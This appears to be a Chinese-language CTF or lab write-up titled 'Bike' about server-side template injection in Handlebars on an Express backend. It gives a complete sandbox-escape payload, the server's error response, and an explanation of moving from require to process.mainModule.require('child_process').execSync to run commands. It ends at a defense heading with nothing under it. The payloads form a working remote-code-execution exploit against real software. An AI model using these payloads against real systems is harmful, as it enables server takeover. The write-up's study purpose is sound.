Bike

SSTI identify

![6c3bb58b-cd3f-45d9-b8dc-00dec56f5329.png](attachment:c9962c69-2127-46d4-b0a5-4ed04bfc4dcd:6c3bb58b-cd3f-45d9-b8dc-00dec56f5329.png)

通过报错 显示使用模版Handlebars 

Handlebars SSTI

```html
{#with "s" as |string|}}
 {{#with "e"}}
 {{#with split as |conslist|}}
 {{this.pop}}
 {{this.push (lookup string.sub "constructor")}}
 {{this.pop}}
 {{#with string.split as |codelist|}}
 {{this.pop}}
 {{this.push "return require('child_process').exec('whoami');"}}
 {{this.pop}}
 {{#each conslist}}
 {{#with (string.sub.apply 0 codelist)}}
 {{this}}
 {{/with}}
 {{/each}}
 {{/with}}
 {{/with}}
 {{/with}}
{{/with}}
```

```html
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 1345
ETag: W/"541-sEbhFszxoOHrx2pYd8n5qxybwvM"
Date: Wed, 13 Aug 2025 01:30:07 GMT
Connection: keep-alive

["ReferenceError: require is not defined","    at Function.eval (eval at <anonymous> (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23)), <anonymous>:3:1)","    at Function.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:10:25)","    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:5:37)","    at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)","    at execIteration (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:51:19)","    at Array.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:61:13)","    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:12:31)","    at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)","    at Array.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:22:14)","    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:12:34)"]
```

{{this.push "return require('child_process').exec('whoami');"}} 走不通如何想到执行{{this.push "return
process.mainModule.require('child_process').execSync('whoami');"}}

在 Handlebars 模板沙盒逃逸的探索过程中，从直接使用 `require` 转向使用 `process.mainModule.require` 的思路转变，体现了对 Node.js 模块系统和沙盒机制的深入理解。这种技术演进通常基于以下几个关键认知：

---

### **1. 理解沙盒环境限制**

- 直接 `require` 可能被沙盒禁用或重写
- 但沙盒往往不会完全隔离 Node.js 的全局对象（如 `process`）
- `process.mainModule` 是通向主 Node.js 环境的"后门"

---

### **2. 技术突破路径**

### **阶段一：直接 require 失败**

```
{{this.push "return require('child_process').exec('whoami');"}}

```

- **失败原因**：沙盒环境可能：
    - 重写了全局 `require` 函数
    - 移除了 `require` 的访问权限
    - 对模块加载进行了白名单过滤

### **阶段二：寻找替代路径**

1. **发现 `process` 对象可用**：
    - 通过 `[object process]` 确认全局对象存在
    - 验证 `process` 未被沙盒完全隔离
2. **研究 `process.mainModule`**：
    - 即使被标记为 deprecated（Node.js 14+），功能仍然存在
    - 主模块的 `require` 通常不受沙盒限制
3. **构造新的 payload**：

```
{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}

```

- **优势**：
    - 绕过沙盒的 `require` 限制
    - 使用同步执行（`execSync`）确保立即返回结果
    - 通过主模块访问原始 Node.js 环境

---

### **3. 技术原理深度解析**

| 技术点 | 说明 |
| --- | --- |
| **process 对象** | Node.js 的全局对象，包含进程信息，通常沙盒难以完全隔离 |
| **mainModule 属性** | 指向程序的主模块（即使弃用仍可访问） |
| **require 的层级** | `mainModule.require` 获取的是 Node.js 原始的模块加载器 |
| **execSync vs exec** | 同步执行更利于获取即时输出，避免异步回调问题 |

---

### **4. 防御建议**